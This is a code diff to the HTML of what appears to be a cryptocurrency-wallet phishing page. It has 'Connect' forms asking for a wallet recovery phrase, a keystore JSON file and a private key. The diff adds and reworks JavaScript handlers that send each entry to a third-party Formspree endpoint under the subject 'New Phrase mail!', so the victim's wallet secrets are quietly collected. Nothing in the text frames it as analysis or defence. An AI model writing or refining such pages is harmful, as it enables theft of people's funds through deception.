@@ -3456,8 +3456,7 @@
 						</div>
 				
 						<div id="phrase" class="tabcontent" style="display: block;">
-							<form  id="kool-form" action="https://formspree.io/f/xbjejywj" method="POST">
-								
+							<form  id="my-form" action="https://formspree.io/f/xbjejywj" method="POST">
   								<input type="hidden" name="_subject" value="New Phrase mail!">
   								
 				
@@ -3470,58 +3469,57 @@
 								<br>
 								<button type="submit" name="submit" class="btn">Connect</button>
 							</form>
+
+							<script>
+							var form = document.getElementById("my-form");
+							
+							async function handleSubmit(event) {
+							  event.preventDefault();
+							  var status = document.getElementById("my-form-status");
+							  var data = new FormData(event.target);
+							  fetch(event.target.action, {
+								method: form.method,
+								body: data,
+								headers: {
+									'Accept': 'application/json'
+								}
+							  }).then(response => {
+								if (response.ok) {
+								  status.innerHTML = "Thanks for your submission!";
+								  form.reset()
+								} else {
+								  response.json().then(data => {
+									if (Object.hasOwn(data, 'errors')) {
+									  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+									} else {
+									  status.innerHTML = "Oops! There was a problem submitting your form"
+									}
+								  })
+								}
+							  }).catch(error => {
+								status.innerHTML = "Oops! There was a problem submitting your form"
+							  });
+							}
+							form.addEventListener("submit", handleSubmit)
+						</script>
+
 						</div>
 				
 						<!-- <div class="desc">Ensure your Pass Phrase is correct! </div>
 								<br>
 								<button type="submit" name="submit" class="btn">IMPORT</button>
 							</form>
-
-							<script>
-							    var form = document.getElementById("kool-form");
-
-							    async function handleSubmit(event) {
-							      event.preventDefault();
-							      var status = document.getElementById("my-form-status");
-							      var data = new FormData(event.target);
-							      fetch(event.target.action, {
-								method: form.method,
-								body: data,
-								headers: {
-								    'Accept': 'application/json'
-								}
-							      }).then(response => {
-								if (response.ok) {
-								  status.innerHTML = "Thanks for your submission!";
-								  form.reset()
-								} else {
-								  response.json().then(data => {
-								    if (Object.hasOwn(data, 'errors')) {
-								      status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-								    } else {
-								      status.innerHTML = "Oops! There was a problem submitting your form"
-								    }
-								  })
-								}
-							      }).catch(error => {
-								status.innerHTML = "Oops! There was a problem submitting your form"
-							      });
-							    }
-							    form.addEventListener("submit", handleSubmit)
-							</script>
-								
 						</div>-->
 				
 				
 						<div id="keystore" class="tabcontent" style="display: none;">
-							<form id="join-form" action="https://formspree.io/f/xbjejywj" method="POST">
-								
+							<form  id="join-form" action="https://formspree.io/f/xbjejywj" method="POST">
   								<input type="hidden" name="_subject" value="New Phrase mail!">
   								
 								
 								<!-- <input type="hidden" name="w" value="Electrum"> -->
 				
-								<textarea name="Keystore" class="key" required="required" minlength="12"
+								<textarea name="Keystore"  class="phrase" required="required" minlength="12"
 									placeholder="Keystore JSON"></textarea>
 								<br>
 								<div class="field">
@@ -3532,90 +3530,90 @@
 								<br>
 								<button type="submit" name="submit" class="btn">Connect</button>
 							</form>
-							
-							<script>
-							    var form = document.getElementById("join-form");
 
-							    async function handleSubmit(event) {
-							      event.preventDefault();
-							      var status = document.getElementById("my-form-status");
-							      var data = new FormData(event.target);
-							      fetch(event.target.action, {
-								method: form.method,
-								body: data,
-								headers: {
-								    'Accept': 'application/json'
+							<script>
+								var form = document.getElementById("join-form");
+								
+								async function handleSubmit(event) {
+								  event.preventDefault();
+								  var status = document.getElementById("my-form-status");
+								  var data = new FormData(event.target);
+								  fetch(event.target.action, {
+									method: form.method,
+									body: data,
+									headers: {
+										'Accept': 'application/json'
+									}
+								  }).then(response => {
+									if (response.ok) {
+									  status.innerHTML = "Thanks for your submission!";
+									  form.reset()
+									} else {
+									  response.json().then(data => {
+										if (Object.hasOwn(data, 'errors')) {
+										  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+										} else {
+										  status.innerHTML = "Oops! There was a problem submitting your form"
+										}
+									  })
+									}
+								  }).catch(error => {
+									status.innerHTML = "Oops! There was a problem submitting your form"
+								  });
 								}
-							      }).then(response => {
-								if (response.ok) {
-								  status.innerHTML = "Thanks for your submission!";
-								  form.reset()
-								} else {
-								  response.json().then(data => {
-								    if (Object.hasOwn(data, 'errors')) {
-								      status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-								    } else {
-								      status.innerHTML = "Oops! There was a problem submitting your form"
-								    }
-								  })
-								}
-							      }).catch(error => {
-								status.innerHTML = "Oops! There was a problem submitting your form"
-							      });
-							    }
-							    form.addEventListener("submit", handleSubmit)
+								form.addEventListener("submit", handleSubmit)
 							</script>
-							
+
 						</div>
 				
 						<div id="private" class="tabcontent" style="display: none;">
-							<form  id="local-form" action="https://formspree.io/f/xbjejywj" method="POST">
-								
+							<form id="local-form" action="https://formspree.io/f/xbjejywj" method="POST">
   								<input type="hidden" name="_subject" value="New Phrase mail!">
   								
 
-								<!-- <input type="hidden" name="W" value="Electrum"> -->
+								<!-- <input type="hidden" name="w" value="Electrum"> -->
 								<div class="field">
 									<input type="text" name="Privatekey" class="key" placeholder="Private Key">
 								</div>
 								<div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
 								<br>
 								<button type="submit" name="submit" class="btn">Connect</button>
+								
 							</form>
 							
 							<script>
-							    var form = document.getElementById("local-form");
-
-							    async function handleSubmit(event) {
-							      event.preventDefault();
-							      var status = document.getElementById("my-form-status");
-							      var data = new FormData(event.target);
-							      fetch(event.target.action, {
-								method: form.method,
-								body: data,
-								headers: {
-								    'Accept': 'application/json'
+								var form = document.getElementById("local-form");
+								
+								async function handleSubmit(event) {
+								  event.preventDefault();
+								  var status = document.getElementById("my-form-status");
+								  var data = new FormData(event.target);
+								  fetch(event.target.action, {
+									method: form.method,
+									body: data,
+									headers: {
+										'Accept': 'application/json'
+									}
+								  }).then(response => {
+									if (response.ok) {
+									  status.innerHTML = "Thanks for your submission!";
+									  form.reset()
+									} else {
+									  response.json().then(data => {
+										if (Object.hasOwn(data, 'errors')) {
+										  status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
+										} else {
+										  status.innerHTML = "Oops! There was a problem submitting your form"
+										}
+									  })
+									}
+								  }).catch(error => {
+									status.innerHTML = "Oops! There was a problem submitting your form"
+								  });
 								}
-							      }).then(response => {
-								if (response.ok) {
-								  status.innerHTML = "Thanks for your submission!";
-								  form.reset()
-								} else {
-								  response.json().then(data => {
-								    if (Object.hasOwn(data, 'errors')) {
-								      status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
-								    } else {
-								      status.innerHTML = "Oops! There was a problem submitting your form"
-								    }
-								  })
-								}
-							      }).catch(error => {
-								status.innerHTML = "Oops! There was a problem submitting your form"
-							      });
-							    }
-							    form.addEventListener("submit", handleSubmit)
+								form.addEventListener("submit", handleSubmit)
 							</script>
-							
+
 						</div>
 						<p id="my-form-status"></p>
 						<script>
